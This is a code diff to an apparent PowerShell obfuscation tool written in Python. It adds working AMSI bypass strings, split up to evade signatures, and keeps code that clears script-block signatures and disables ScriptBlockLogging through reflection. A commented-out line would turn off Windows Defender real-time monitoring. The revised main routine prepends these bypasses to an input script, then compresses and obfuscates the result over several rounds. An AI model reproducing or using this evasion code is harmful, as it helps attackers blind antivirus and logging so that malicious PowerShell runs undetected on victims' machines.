@@ -21,11 +21,12 @@ O_DEBUG = False
 O_DEBUG_PATH = './debug_obfu/'
 
 bypass = [
-    """[Ref].Assembly.GetType("Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
+    """[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)""",
+    """[Ref].Assembly.GetType("Management.Automation.Sc"+"riptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
     """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
     """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
-    """[Ref].Assembly.GetType('Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
+#    """Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend""",
     ]
 
 def get_cmdlets():
@@ -200,7 +201,7 @@ if __name__ == "__main__":
     parser.add_argument('-d', '--debug', help='Enable Debug Logging', default=False, action="store_true")
     parser.add_argument('-ng', '--no-gzip', help='No Inital GZIP', default=False, action="store_true")
     parser.add_argument('-r', '--rounds', help='# of Obfuscation Rounds', type=int, default=2)
-    parser.add_argument('file', help='Powershell script to obfuscate')
+    parser.add_argument('file', help='Powershell script to obfuscate, - for stdin')
     args = parser.parse_args()
     
     
@@ -216,23 +217,27 @@ if __name__ == "__main__":
         O_DEBUG_PATH = args.debug_obfu_path
         log.info('Output Debugging Path "{0}"'.format(O_DEBUG_PATH) )
     
+    if args.file == '-':
+        _file = sys.stdin
+    else:
+        _file = open(args.file)
     
-    with open(args.file,'r') as f:
-        c = []
-        p = f.read()
-        build_bypass()
-        p = cmdlet_obfu(p)
-        #b = string_obfu(bypass)
-        p = string_obfu(p)
-        #print(p)
-        #gzip first makes sure its smaller
-        if not args.no_gzip:
-            p = gz(p)
-        p = '{0};$x="";{1}'.format('',p)
-        
-        [(a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(args.rounds)]
-        
     
+    c = []
+    p = _file.read()
+    p = cmdlet_obfu(p)
+    b = string_obfu(build_bypass())
+    p = string_obfu(p)
+    #print(p)
+    #gzip first makes sure its smaller
+    if not args.no_gzip:
+        p = gz(p)
+    p = '{0};$x="";{1}'.format(b,string_obfu(p))
+    if not args.no_gzip:
+        p = gz(p)
+    [(a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(args.rounds)]
+    
+
     print(p)
     log.info("Rounds ran:")
     for r in c:
